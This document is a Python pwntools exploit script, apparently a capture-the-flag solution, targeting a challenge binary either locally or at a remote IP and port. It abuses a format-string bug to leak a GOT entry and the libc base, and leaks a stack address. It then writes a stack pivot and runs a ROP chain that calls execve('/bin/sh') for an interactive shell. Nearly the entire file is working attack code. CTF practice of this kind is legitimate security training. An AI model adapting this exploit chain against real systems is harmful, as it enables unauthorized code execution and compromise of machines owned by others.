from pwn import *
from icecream import ic

elf = exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("152.69.210.130", 2004)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x4014a1
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

while True:
    ru("Lucky number: ")
    if int(rl().strip()) == 0x44:
        # gdb.attach(io, gdbscript='b *0x401534')
        # for i in range(6, 40):
        #     sl(b'a')
        #     # sl(b'a'*0x36 + b'b')
        #     sl(f'%{i}$p'.encode())
        #     ru(b'Enter your name: ')
        pause()
        sl(b'a')
        sl(b'%7$s'.rjust(8, b'a')+p64(elf.got['puts']))
        ru(b'Enter your name: ')
        ru(b'aaaa')
        libc.address = u64(re(6).ljust(8, b'\x00')) - libc.sym['puts']
            # libc.address = int(ru(".").strip(), 16) - 0x29dc0 + 0x30
        sl(b'a')
        sl(b'%40$p')
        ru(b'Enter your name: ')
        stack_addr = int(rl().strip(), 16) - 0x18
        ret = libc.address + 0x0000000000029139
        pop_rdi = libc.address + 0x000000000002a3e5
        pop_rsi = libc.address + 0x000000000002be51
        pop_rdx_rbx = libc.address + 0x00000000000904a9
        syscall = libc.address + 0x0000000000029db4
        leave_ret = libc.address + 0x000000000004da83
        pop_rax = libc.address + 0x0000000000045eb0
        binsh = next(libc.search(b'/bin/sh\x00'))
        system = libc.sym['system']
        sl(b'a')
        writes = {
            stack_addr: leave_ret,
            stack_addr-8: stack_addr-0x70-0x30
        }
        payload = fmtstr_payload(6, writes, write_size = "short")
        payload = payload.ljust(0xd8-0x28-0x30, b'a')
        payload += p64(pop_rdi)
        payload += p64(binsh)
        payload += p64(pop_rsi)
        payload += p64(0)
        payload += p64(pop_rdx_rbx)
        payload += p64(0)
        payload += p64(0)
        payload += p64(pop_rax)
        payload += p64(59)
        payload += p64(syscall)
        # payload = fmtstr_payload(6, {stack_addr+16: libc.sym['system']})
        sla("Enter your name: ", payload)
            # sla(b"2. Exit\n", b'a')
            # payload = fmtstr_payload(6, {stack_addr+8: next(libc.search(b'/bin/sh\x00'))})
            # sla("Enter your name: ", payload)
            # sl(b'a')
            # payload = fmtstr_payload(6, {stack_addr: pop_rdi})
            # sla("Enter your name: ", payload)
        ic(hex(libc.address))
        ic(hex(stack_addr))
        io.interactive()
    else:
        io.close()
        io = start()

io.interactive()